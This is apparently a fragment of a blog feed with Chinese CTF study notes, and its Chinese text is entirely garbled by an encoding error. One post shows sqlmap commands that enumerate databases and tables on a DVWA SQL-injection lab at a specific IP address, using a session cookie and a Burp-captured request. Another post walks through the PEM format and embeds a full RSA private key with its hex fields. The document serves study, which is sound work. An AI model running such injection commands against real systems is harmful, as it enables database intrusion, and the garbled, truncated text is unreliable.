title="æ³¨å…¥æ–¹æ³•"></a>æ³¨å…¥æ–¹æ³•</h2><p>åœ¨å®ç°SQLæ³¨å…¥æ—¶ï¼Œæ—¢å¯è‡ªå·±æ‰‹åŠ¨æ³¨å…¥ï¼Œä¹Ÿå¯ä½¿ç”¨æ”»å‡»è¿›è¡Œæ³¨å…¥ï¼Œè¿™ä¸€èŠ‚ä¸»è¦è®°å½•æ‰‹åŠ¨æ³¨å…¥æ–¹æ³•ï¼Œä½¿ç”¨å·¥å…·çš„æ³¨å…¥å°†åœ¨åæ–‡å•ç‹¬è®°å½•ã€‚</p><h2 id="æ³¨å…¥å·¥å…·ä½¿ç”¨"><a href="#æ³¨å…¥å·¥å…·ä½¿ç”¨" class="headerlink" title="æ³¨å…¥å·¥å…·ä½¿ç”¨"></a>æ³¨å…¥å·¥å…·ä½¿ç”¨</h2><h3 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h3><p><strong>ä¸‹è½½å®˜ç½‘ï¼š</strong> <a href="https://sqlmap.org/">https://sqlmap.org/</a></p><h4 id="sqlmapä½¿ç”¨æ–¹æ³•"><a href="#sqlmapä½¿ç”¨æ–¹æ³•" class="headerlink" title="sqlmapä½¿ç”¨æ–¹æ³•"></a>sqlmapä½¿ç”¨æ–¹æ³•</h4><p>æ‰€æœ‰å‚æ•°éƒ½å¯ä½¿ç”¨<code>python sqlmap.py -h</code>æŸ¥çœ‹</p><ul><li><strong>ä½¿ç”¨URLè¿›è¡ŒSQLæ³¨å…¥</strong><br>ä½¿ç”¨<code>-u</code>å‚æ•°ï¼Œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u <span class="hljs-string">&quot;http://159.75.236.232:8081/vulnerabilities/sqli/?id=1*&amp;Submit=Submit#&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=6u59tajkoksou1f7ulk1lpgra3;security=low&quot;</span> --dbs<br></code></pre></td></tr></table></figure><p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145034446.png"></p><h4 id="sqlmapè”åˆbupsuiteè¿›è¡Œæ³¨å…¥"><a href="#sqlmapè”åˆbupsuiteè¿›è¡Œæ³¨å…¥" class="headerlink" title="sqlmapè”åˆbupsuiteè¿›è¡Œæ³¨å…¥"></a>sqlmapè”åˆbupsuiteè¿›è¡Œæ³¨å…¥</h4><p>æ‰“å¼€ç«ç‹æµè§ˆå™¨çš„bpä»£ç†ï¼Œåœ¨æäº¤å‰å¼€å¯æ‹¦æˆªï¼Œä½¿ç”¨bpè¿›è¡ŒæŠ“å–æ•°æ®åŒ…ï¼Œç„¶åç‚¹å‡»<code>Save item</code>ä¿å­˜åˆ°æœ¬åœ°ä¸º<code>txt</code>æ–‡ä»¶<br><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145440655.png"><br>ç„¶åä½¿ç”¨sqlmapçš„<code>-r</code>å‚æ•°è¿›è¡Œæ³¨å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r C:\Users\Desktop\1.txt --dbs<br></code></pre></td></tr></table></figure><p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704150750850.png"><br>ä¹‹åæ ¹æ®æ‰«æå‡ºçš„æ•°æ®åº“ï¼Œä¾¿å¯ä»¥è¿›è¡Œè¿›ä¸€æ­¥è¡¨çš„æ‰«æ<br>ä½¿ç”¨<code>-D dbname --tables</code>å‚æ•°è¿›è¡Œæ³¨å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r C:\Users\29226\Desktop\1.txt -D dvwa --tables<br></code></pre></td></tr></table></figure><p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704151403241.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CryptoåŸºç¡€ç¯‡-PEMæ–‡ä»¶</title>
    <link href="/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/"/>
    <url>/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p><strong>PEM</strong>ï¼šPrivacy Enhanced Mailï¼Œå³å¢å¼ºéšç§é‚®ä»¶ï¼Œæ˜¯ä¸€ç§ä¸»è¦ç”¨äºSSL&#x2F;TLSé€šä¿¡ã€æ•°å­—ç­¾åã€åŠ å¯†é€šä¿¡ç­‰é¢†åŸŸçš„æ–‡ä»¶æ ¼å¼ã€‚</p><p><strong>DERï¼š</strong> æ˜¯ä¸€ç§å¹¿æ³›ç”¨äºå„ç§åŠ å¯†å’Œå®‰å…¨é€šä¿¡åè®®ä¸­çš„äºŒè¿›åˆ¶ç¼–ç æ ¼å¼ï¼Œå°¤å…¶æ˜¯X.509è¯ä¹¦å’ŒPKCS#8ç§é’¥çš„å­˜å‚¨å’Œä¼ è¾“ä¸­ã€‚</p><p><strong>å…³ç³»ï¼š</strong> PEMæ˜¯DERè¯ä¹¦çš„base64ç¼–ç æ ¼å¼</p><h2 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h2><p>æ ¹æ®ä¼ è¾“çš„å†…å®¹ä¸åŒï¼ŒPEMèƒ½è¢«åˆ†ä¸ºå¤šç§æ–‡ä»¶ï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸‰ç§</p><h3 id="1-è¯ä¹¦"><a href="#1-è¯ä¹¦" class="headerlink" title="1.è¯ä¹¦"></a>1.è¯ä¹¦</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">-----</span><span class="hljs-comment">BEGIN CERTIFICATE</span><span class="hljs-literal">-----</span><br><span class="hljs-comment">(è¯ä¹¦å†…å®¹çš„base64æ ¼å¼)</span><br><span class="hljs-literal">-----</span><span class="hljs-comment">END CERTIFICATE</span><span class="hljs-literal">-----</span><br></code></pre></td></tr></table></figure><h3 id="2-å…¬é’¥"><a href="#2-å…¬é’¥" class="headerlink" title="2.å…¬é’¥"></a>2.å…¬é’¥</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br>(å…¬é’¥çš„base64æ ¼å¼)<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><h3 id="3-ç§é’¥"><a href="#3-ç§é’¥" class="headerlink" title="3.ç§é’¥"></a>3.ç§é’¥</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br>(ç§é’¥çš„base64æ ¼å¼)<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><h2 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h2><p><strong>ç¤ºä¾‹ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>MIICXAIBAAKBgQDnsN1F66mF6h6y/XpyN+ZU/w5AyeWBjZNIqi33/ATn4qQpw+kD<br>HrKyF7sQ/RNw6tibM90iM6VOA14305umPbPROJJs3JoB6Lao74SUm58aO9T+Ct7r<br>O52E+3r5jyDQicdRl6lIhLigNADXPD/KoNwfrRrCyw4wTHMZhSHc8eUHeQIDAQAB<br>AoGABVTIgqddiztL4Yp7ms02e5Yy2cLLiSOc0/s2e5JM+pj4dg2P+wZlzjtFjqqE<br>HAELYubam8LcduMU8+vmlPiufoK9fo47fLsX1PFCY9TDKL1dFlZgBAmJU7hR27h/<br>gCo4r3PMub/snq7n+skrbarZbX1J6Q1o5UYKFIrrIjNObEECQQD0DIzIdMObPUUu<br>W+JXg10kz/ayYn3irxZmp5ngc+b9WZfSOPehZBsLWsIb1eC7y9DZMhZfBQ/sPaO8<br>0tvqJMUFAkEA8wlj3B3zK20pK+Hj+vFiAlaQmqILTSfv/9jMm8tbVfXt+bHrmZdN<br>jruGVQDb7V2pW9HeG5PgDB3vKXeOiVfC5QJAYikKFzaf1rj2ModSqtBzjnL3Txi+<br>eYbjA7c19UmpBw4aOrwfHhMdrZt7p6aHFgIMps+2n9Fxbhv8194YBj1z4QJAPONW<br>XFg4iuGvVeoi9sSwvEs5sTP1xt/BlgSXxlRdTpztgQgdMX6hlKfQkM1FTCOSAYoD<br>rj8O+5ooR+hHEoulLQJBAOtaMvMWIOG7mARngpwqfJ07L41/T0ITHteiiYJfCurz<br>kLVCx1XA3MlN+u5gn7osUHMbah0Ze3uakSZ6za3mL5Y=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><strong>è§£æï¼š</strong><br>å°†base64ç¼–ç çš„å­—ç¬¦ä¸²è§£ç ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºçš„äºŒè¿›åˆ¶æ•°æ®ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3082025</span><span class="hljs-keyword">c</span><span class="hljs-number">02010002818100e7</span>b<span class="hljs-number">0</span>dd<span class="hljs-number">45</span>eba<span class="hljs-number">985</span>ea<span class="hljs-number">1</span>eb<span class="hljs-number">2</span>fd<span class="hljs-number">7</span>a<span class="hljs-number">7237e654</span>ff<span class="hljs-number">0e40</span><span class="hljs-keyword">c</span><span class="hljs-number">9e5818</span>d<span class="hljs-number">9348</span>aa<span class="hljs-number">2</span>df<span class="hljs-number">7</span>fc<span class="hljs-number">04e7</span>e<span class="hljs-number">2</span>a<span class="hljs-number">429</span><span class="hljs-keyword">c</span><span class="hljs-number">3e9031</span>eb<span class="hljs-number">2</span>b<span class="hljs-number">217</span>bb<span class="hljs-number">10</span>fd<span class="hljs-number">1370</span>ead<span class="hljs-number">89</span>b<span class="hljs-number">33</span>dd<span class="hljs-number">2233</span>a<span class="hljs-number">54e035</span>e<span class="hljs-number">37</span>d<span class="hljs-number">39</span>ba<span class="hljs-number">63</span>db<span class="hljs-number">3</span>d<span class="hljs-number">138926</span>cdc<span class="hljs-number">9</span>a<span class="hljs-number">01e8</span>b<span class="hljs-number">6</span>a<span class="hljs-number">8</span>ef<span class="hljs-number">84949</span>b<span class="hljs-number">9</span>f<span class="hljs-number">1</span>a<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>fe<span class="hljs-number">0</span>adeeb<span class="hljs-number">3</span>b<span class="hljs-number">9</span>d<span class="hljs-number">84</span>fb<span class="hljs-number">7</span>af<span class="hljs-number">98</span>f<span class="hljs-number">20</span>d<span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">75197</span>a<span class="hljs-number">94884</span>b<span class="hljs-number">8</span>a<span class="hljs-number">03400</span>d<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>fcaa<span class="hljs-number">0</span>dc<span class="hljs-number">1</span>fad<span class="hljs-number">1</span>ac<span class="hljs-number">2</span>cb<span class="hljs-number">0e304</span><span class="hljs-keyword">c</span><span class="hljs-number">73198521</span>dcf<span class="hljs-number">1e5077902030100010281800554</span><span class="hljs-keyword">c</span><span class="hljs-number">882</span>a<span class="hljs-number">75</span>d<span class="hljs-number">8</span>b<span class="hljs-number">3</span>b<span class="hljs-number">4</span>be<span class="hljs-number">18</span>a<span class="hljs-number">7</span>b<span class="hljs-number">9</span>acd<span class="hljs-number">367</span>b<span class="hljs-number">9632</span>d<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>cb<span class="hljs-number">89239</span>cd<span class="hljs-number">3</span>fb<span class="hljs-number">367</span>b<span class="hljs-number">924</span>cfa<span class="hljs-number">98</span>f<span class="hljs-number">8760</span>d<span class="hljs-number">8</span>ffb<span class="hljs-number">0665</span>ce<span class="hljs-number">3</span>b<span class="hljs-number">458</span>eaa<span class="hljs-number">841</span><span class="hljs-keyword">c</span><span class="hljs-number">010</span>b<span class="hljs-number">62e6</span>da<span class="hljs-number">9</span>bc<span class="hljs-number">2</span>dc<span class="hljs-number">76e314</span>f<span class="hljs-number">3</span>ebe<span class="hljs-number">694</span>f<span class="hljs-number">8</span>ae<span class="hljs-number">7e82</span>bd<span class="hljs-number">7e8</span>e<span class="hljs-number">3</span>b<span class="hljs-number">7</span>cbb<span class="hljs-number">17</span>d<span class="hljs-number">4</span>f<span class="hljs-number">14263</span>d<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">328</span>bd<span class="hljs-number">5</span>d<span class="hljs-number">16566004098953</span>b<span class="hljs-number">851</span>dbb<span class="hljs-number">87</span>f<span class="hljs-number">802</span>a<span class="hljs-number">38</span>af<span class="hljs-number">73</span>ccb<span class="hljs-number">9</span>bfec<span class="hljs-number">9</span>eaee<span class="hljs-number">7</span>fac<span class="hljs-number">92</span>b<span class="hljs-number">6</span>daad<span class="hljs-number">96</span>d<span class="hljs-number">7</span>d<span class="hljs-number">49e90</span>d<span class="hljs-number">68e5460</span>a<span class="hljs-number">148</span>aeb<span class="hljs-number">22334e6</span><span class="hljs-keyword">c</span><span class="hljs-number">41024100</span>f<span class="hljs-number">40</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">874</span><span class="hljs-keyword">c</span><span class="hljs-number">39</span>b<span class="hljs-number">3</span>d<span class="hljs-number">452e5</span>be<span class="hljs-number">257835</span>d<span class="hljs-number">24</span>cff<span class="hljs-number">6</span>b<span class="hljs-number">2627</span>de<span class="hljs-number">2</span>af<span class="hljs-number">1666</span>a<span class="hljs-number">799e073</span>e<span class="hljs-number">6</span>fd<span class="hljs-number">5997</span>d<span class="hljs-number">238</span>f<span class="hljs-number">7</span>a<span class="hljs-number">1641</span>b<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ac<span class="hljs-number">21</span>bd<span class="hljs-number">5e0</span>bbcbd<span class="hljs-number">0</span>d<span class="hljs-number">932165</span>f<span class="hljs-number">050</span>fec<span class="hljs-number">3</span>da<span class="hljs-number">3</span>bcd<span class="hljs-number">2</span>dbea<span class="hljs-number">24</span><span class="hljs-keyword">c</span><span class="hljs-number">505024100</span>f<span class="hljs-number">30963</span>dc<span class="hljs-number">1</span>df<span class="hljs-number">32</span>b<span class="hljs-number">6</span>d<span class="hljs-number">292</span>be<span class="hljs-number">1e3</span>faf<span class="hljs-number">1620256909</span>aa<span class="hljs-number">20</span>b<span class="hljs-number">4</span>d<span class="hljs-number">27</span>efffd<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">9</span>bcb<span class="hljs-number">5</span>b<span class="hljs-number">55</span>f<span class="hljs-number">5</span>edf<span class="hljs-number">9</span>b<span class="hljs-number">1</span>eb<span class="hljs-number">99974</span>d<span class="hljs-number">8</span>ebb<span class="hljs-number">865500</span>dbed<span class="hljs-number">5</span>da<span class="hljs-number">95</span>bd<span class="hljs-number">1</span>de<span class="hljs-number">1</span>b<span class="hljs-number">93e00</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>def<span class="hljs-number">29778e8957</span><span class="hljs-keyword">c</span><span class="hljs-number">2e5024062290</span>a<span class="hljs-number">17369</span>fd<span class="hljs-number">6</span>b<span class="hljs-number">8</span>f<span class="hljs-number">6328752</span>aad<span class="hljs-number">0738e72</span>f<span class="hljs-number">74</span>f<span class="hljs-number">18</span>be<span class="hljs-number">7986e303</span>b<span class="hljs-number">735</span>f<span class="hljs-number">549</span>a<span class="hljs-number">9070e1</span>a<span class="hljs-number">3</span>abc<span class="hljs-number">1</span>f<span class="hljs-number">1e131</span>dad<span class="hljs-number">9</span>b<span class="hljs-number">7</span>ba<span class="hljs-number">7</span>a<span class="hljs-number">68716020</span>ca<span class="hljs-number">6</span>cfb<span class="hljs-number">69</span>fd<span class="hljs-number">1716e1</span>bfcd<span class="hljs-number">7</span>de<span class="hljs-number">18063</span>d<span class="hljs-number">73e102403</span>ce<span class="hljs-number">3565</span><span class="hljs-keyword">c</span><span class="hljs-number">58388</span>ae<span class="hljs-number">1</span>af<span class="hljs-number">55</span>ea<span class="hljs-number">22</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">0</span>bc<span class="hljs-number">4</span>b<span class="hljs-number">39</span>b<span class="hljs-number">133</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>dfc<span class="hljs-number">1960497</span><span class="hljs-keyword">c</span><span class="hljs-number">6545</span>d<span class="hljs-number">4e9</span>ced<span class="hljs-number">81081</span>d<span class="hljs-number">317</span>ea<span class="hljs-number">194</span>a<span class="hljs-number">7</span>d<span class="hljs-number">090</span>cd<span class="hljs-number">454</span><span class="hljs-keyword">c</span><span class="hljs-number">2392018</span>a<span class="hljs-number">03</span>ae<span class="hljs-number">3</span>f<span class="hljs-number">0</span>efb<span class="hljs-number">9</span>a<span class="hljs-number">2847e847128</span>ba<span class="hljs-number">52</span>d<span class="hljs-number">024100</span>eb<span class="hljs-number">5</span>a<span class="hljs-number">32</span>f<span class="hljs-number">31620e1</span>bb<span class="hljs-number">980467829</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>a<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">3</span>b<span class="hljs-number">2</span>f<span class="hljs-number">8</span>d<span class="hljs-number">7</span>f<span class="hljs-number">4</span>f<span class="hljs-number">42131</span>ed<span class="hljs-number">7</span>a<span class="hljs-number">289825</span>f<span class="hljs-number">0</span>aeaf<span class="hljs-number">390</span>b<span class="hljs-number">542</span><span class="hljs-keyword">c</span><span class="hljs-number">755</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>dcc<span class="hljs-number">94</span>dfaee<span class="hljs-number">609</span>fba<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">50731</span>b<span class="hljs-number">6</span>a<span class="hljs-number">1</span>d<span class="hljs-number">197</span>b<span class="hljs-number">7</span>b<span class="hljs-number">9</span>a<span class="hljs-number">91267</span>acdade<span class="hljs-number">62</span>f<span class="hljs-number">96</span><br></code></pre></td></tr></table></figure><p><strong>æ•°æ®æ‹†åˆ†ï¼š</strong><br>ç§é’¥çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">RSAPrivateKey ::= <span class="hljs-keyword">SEQUENCE</span> &#123;<br>  <span class="hljs-keyword">version</span>           <span class="hljs-keyword">Version</span>,           <span class="hljs-comment">-- INTEGERï¼ˆä¸€èˆ¬æ˜¯ 0ï¼‰</span><br>  modulus           <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- n</span><br>  publicExponent    <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- e</span><br>  privateExponent   <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d</span><br>  prime1            <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- p</span><br>  prime2            <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- q</span><br>  exponent1         <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d mod (p-1)</span><br>  exponent2         <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d mod (q-1)</span><br>  coefficient       <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- q^(-1) mod p</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>3082 025cï¼š</strong> 30å˜é€SEQUENCEç±»å‹ï¼Œ025cæŒ‡ä¸‹é¢æ–‡ä»¶å†…å®¹çš„å­—èŠ‚æ•°ï¼ˆ0x025cæ˜¯572å­—èŠ‚ï¼‰</li><li><strong>02 01 00ï¼š</strong> ç‰ˆæœ¬ï¼Œ02è¡¨ç¤ºæ•´å‹ï¼Œ01è¡¨ç¤ºé•¿åº¦ä¸º1å­—èŠ‚ï¼Œ00è¡¨ç¤ºç‰ˆæœ¬å·ä¸º0</li><li><strong>02 81 81ï¼š</strong> æ¨¡æ•°nï¼Œ02è¡¨ç¤ºæ•´å‹ï¼Œé•¿åº¦ä¸º129å­—èŠ‚ï¼ˆ0x81ï¼‰</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">n <span class="hljs-operator">=</span> <span class="hljs-number">00e7</span>b<span class="hljs-number">0</span>dd<span class="hljs-number">45</span>eba<span class="hljs-number">985</span>ea<span class="hljs-number">1</span>eb<span class="hljs-number">2</span>fd<span class="hljs-number">7</span>a<span class="hljs-number">7237e654</span>ff<span class="hljs-number">0e40</span><span class="hljs-keyword">c</span><span class="hljs-number">9e5818</span>d<span class="hljs-number">9348</span>aa<span class="hljs-number">2</span>df<span class="hljs-number">7</span>fc<span class="hljs-number">04e7</span>e<span class="hljs-number">2</span>a<span class="hljs-number">429</span><span class="hljs-keyword">c</span><span class="hljs-number">3e9031</span>eb<span class="hljs-number">2</span>b<span class="hljs-number">217</span>bb<span class="hljs-number">10</span>fd<span class="hljs-number">1370</span>ead<span class="hljs-number">89</span>b<span class="hljs-number">33</span>dd<span class="hljs-number">2233</span>a<span class="hljs-number">54e035</span>e<span class="hljs-number">37</span>d<span class="hljs-number">39</span>ba<span class="hljs-number">63</span>db<span class="hljs-number">3</span>d<span class="hljs-number">138926</span>cdc<span class="hljs-number">9</span>a<span class="hljs-number">01e8</span>b<span class="hljs-number">6</span>a<span class="hljs-number">8</span>ef<span class="hljs-number">84949</span>b<span class="hljs-number">9</span>f<span class="hljs-number">1</span>a<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>fe<span class="hljs-number">0</span>adeeb<span class="hljs-number">3</span>b<span class="hljs-number">9</span>d<span class="hljs-number">84</span>fb<span class="hljs-number">7</span>af<span class="hljs-number">98</span>f<span class="hljs-number">20</span>d<span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">75197</span>a<span class="hljs-number">94884</span>b<span class="hljs-number">8</span>a<span class="hljs-number">03400</span>d<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>fcaa<span class="hljs-number">0</span>dc<span class="hljs-number">1</span>fad<span class="hljs-number">1</span>ac<span class="hljs-number">2</span>cb<span class="hljs-number">0e304</span><span class="hljs-keyword">c</span><span class="hljs-number">73198521</span>dcf<span class="hljs-number">1e50779</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 03ï¼š</strong> å…¬é’¥æŒ‡æ•°eï¼Œ02è¡¨ç¤ºæ•´å‹ï¼ˆæ­¤ä½ç½®è‹¥æ˜¯03è¡¨ç¤º BIT STRINGï¼‰ï¼Œ03é•¿åº¦ä¸º3å­—èŠ‚</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">010001</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 81 80ï¼š</strong> ç§é’¥æŒ‡æ•°dï¼Œ0x80è¡¨ç¤ºé•¿åº¦128å­—èŠ‚</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">d <span class="hljs-operator">=</span> <span class="hljs-number">0554</span><span class="hljs-keyword">c</span><span class="hljs-number">882</span>a<span class="hljs-number">75</span>d<span class="hljs-number">8</span>b<span class="hljs-number">3</span>b<span class="hljs-number">4</span>be<span class="hljs-number">18</span>a<span class="hljs-number">7</span>b<span class="hljs-number">9</span>acd<span class="hljs-number">367</span>b<span class="hljs-number">9632</span>d<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>cb<span class="hljs-number">89239</span>cd<span class="hljs-number">3</span>fb<span class="hljs-number">367</span>b<span class="hljs-number">924</span>cfa<span class="hljs-number">98</span>f<span class="hljs-number">8760</span>d<span class="hljs-number">8</span>ffb<span class="hljs-number">0665</span>ce<span class="hljs-number">3</span>b<span class="hljs-number">458</span>eaa<span class="hljs-number">841</span><span class="hljs-keyword">c</span><span class="hljs-number">010</span>b<span class="hljs-number">62e6</span>da<span class="hljs-number">9</span>bc<span class="hljs-number">2</span>dc<span class="hljs-number">76e314</span>f<span class="hljs-number">3</span>ebe<span class="hljs-number">694</span>f<span class="hljs-number">8</span>ae<span class="hljs-number">7e82</span>bd<span class="hljs-number">7e8</span>e<span class="hljs-number">3</span>b<span class="hljs-number">7</span>cbb<span class="hljs-number">17</span>d<span class="hljs-number">4</span>f<span class="hljs-number">14263</span>d<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">328</span>bd<span class="hljs-number">5</span>d<span class="hljs-number">16566004098953</span>b<span class="hljs-number">851</span>dbb<span class="hljs-number">87</span>f<span class="hljs-number">802</span>a<span class="hljs-number">38</span>af<span class="hljs-number">73</span>ccb<span class="hljs-number">9</span>bfec<span class="hljs-number">9</span>eaee<span class="hljs-number">7</span>fac<span class="hljs-number">92</span>b<span class="hljs-number">6</span>daad<span class="hljs-number">96</span>d<span class="hljs-number">7</span>d<span class="hljs-number">49e90</span>d<span class="hljs-number">68e5460</span>a<span class="hljs-number">148</span>aeb<span class="hljs-number">22334e6</span><span class="hljs-keyword">c</span><span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 41ï¼š</strong> ç´ æ•°pï¼Œ0x41è¡¨ç¤ºé•¿åº¦65å­—èŠ‚</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">p <span class="hljs-operator">=</span> <span class="hljs-number">00</span>f<span class="hljs-number">40</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">874</span><span class="hljs-keyword">c</span><span class="hljs-number">39</span>b<span class="hljs-number">3</span>d<span class="hljs-number">452e5</span>be<span class="hljs-number">257835</span>d<span class="hljs-number">24</span>cff<span class="hljs-number">6</span>b<span class="hljs-number">2627</span>de<span class="hljs-number">2</span>af<span class="hljs-number">1666</span>a<span class="hljs-number">799e073</span>e<span class="hljs-number">6</span>fd<span class="hljs-number">5997</span>d<span class="hljs-number">238</span>f<span class="hljs-number">7</span>a<span class="hljs-number">1641</span>b<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ac<span class="hljs-number">21</span>bd<span class="hljs-number">5e0</span>bbcbd<span class="hljs-number">0</span>d<span class="hljs-number">932165</span>f<span class="hljs-number">050</span>fec<span class="hljs-number">3</span>da<span class="hljs-number">3</span>bcd<span class="hljs-number">2</span>dbea<span class="hljs-number">24</span><span class="hljs-keyword">c</span><span class="hljs-number">505</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 41ï¼š</strong> ç´ æ•°qï¼ŒåŒä¸Š</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">q <span class="hljs-operator">=</span> <span class="hljs-number">00</span>f<span class="hljs-number">30963</span>dc<span class="hljs-number">1</span>df<span class="hljs-number">32</span>b<span class="hljs-number">6</span>d<span class="hljs-number">292</span>be<span class="hljs-number">1e3</span>faf<span class="hljs-number">1620256909</span>aa<span class="hljs-number">20</span>b<span class="hljs-number">4</span>d<span class="hljs-number">27</span>efffd<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">9</span>bcb<span class="hljs-number">5</span>b<span class="hljs-number">55</span>f<span class="hljs-number">5</span>edf<span class="hljs-number">9</span>b<span class="hljs-number">1</span>eb<span class="hljs-number">99974</span>d<span class="hljs-number">8</span>ebb<span class="hljs-number">865500</span>dbed<span class="hljs-number">5</span>da<span class="hljs-number">95</span>bd<span class="hljs-number">1</span>de<span class="hljs-number">1</span>b<span class="hljs-number">93e00</span><span 